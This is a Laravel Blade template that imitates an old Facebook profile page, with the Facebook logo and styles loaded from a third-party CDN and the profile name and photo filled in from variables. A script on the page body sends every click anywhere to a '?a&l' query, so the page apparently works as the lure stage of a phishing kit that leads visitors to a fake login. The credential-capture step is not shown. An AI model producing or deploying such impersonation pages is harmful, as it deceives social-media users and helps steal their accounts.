<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>{{ $data->title }}</title>
    <meta name="description" content="{{ $data->description }}">
    <meta property="og:locale" content="en_US">
    <meta property="og:type" content="website">
    <meta content='text/html; charset=UTF-8' http-equiv='Content-Type' />
    <meta property="og:image" content="{{ $data->image }}" />
    <meta property="og:title" content="{{ $data->title }}">
    <meta property="og:description" content="{{ $data->description }}">
    <meta property="og:site_name" content="{{ $data->title }}">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:description" content="{{ $data->description }}">
    <meta name="twitter:title" content="{{ $data->title }}">
    <link rel="shortcut icon"
        href="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/fblogo.png">
    <link rel="stylesheet"
        href="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebookprofile/style.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.0/jquery.min.js"></script>
    <style>
        @keyframes fade {
            from {
                opacity: 0;
            }

            to {
                opacity: 1;
            }
        }

        .d-block {
            display: block !important;
        }
    </style>
</head>

<body onclick="showLog()">
    <div id="main">
        <div class="box-logo">
            <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebookprofile/fblogo.png"
                width="104">
        </div>
        <div class="join-now-con">
            <div class="text">
                <strong>{{ __('common/oldfacebookprofile.on_facebook', ['name' => $data->title]) }}</strong>
                {{ __('common/oldfacebookprofile.to_connect', ['name' => $data->title]) }}</div>
            <div class="text-center">
                <button class="btn-join">
                    {{ __('common/oldfacebookprofile.join_facebook') }}
                </button>
                <div class="or-or">
                    <div class="or-border">
                        <span class="or-or-or">{{ __('common/oldfacebookprofile.or') }}</span>
                    </div>
                </div>
                <a class="btn-login">
                    {{ __('common/oldfacebookprofile.login') }}
                </a>
            </div>
        </div>
        <div class="banner-bg">
            <div class="banner">
                <div class="banner-p">
                </div>
                <center>
                    <div class="avatar">
                        <div class="avatar-chua">
                            <img src="{{ $data->image }}" width="116" height="116" style="object-fit: cover">
                        </div>
                    </div>
                    <div class="name-profile">
                        <h3>{{ $data->title }}</h3>
                    </div>
                </center>
            </div>
        </div>
        <div class="profile-menu">
            <div class="profile-item">
                <a href="#">
                    <div class="profile-text">{{ __('common/oldfacebookprofile.friends') }}</div>
                </a>
            </div>
            <div class="profile-item">
                <a href="#">
                    <div class="profile-text">{{ __('common/oldfacebookprofile.photos') }}</div>
                </a>
            </div>
            <div class="profile-item">
                <a href="#">
                    <div class="profile-text">{{ __('common/oldfacebookprofile.videos') }}</div>
                </a>
            </div>
        </div>
        <div class="other-thing">
            <div class="other-header">
                {{ __('common/oldfacebookprofile.other_people_with_name', ['name' => $data->title]) }}</div>
            <div class="other-view"><a href="#">{{ __('common/oldfacebookprofile.view_more') }}</a></div>
        </div>
        <div class="other-thing">
            <div class="other-header">{{ __('common/oldfacebookprofile.similar_people') }}</div>
        </div>
    </div>
    <script>
        function showLog() {
            window.location = "?a&l"
        }
    </script>
</body>

</html>
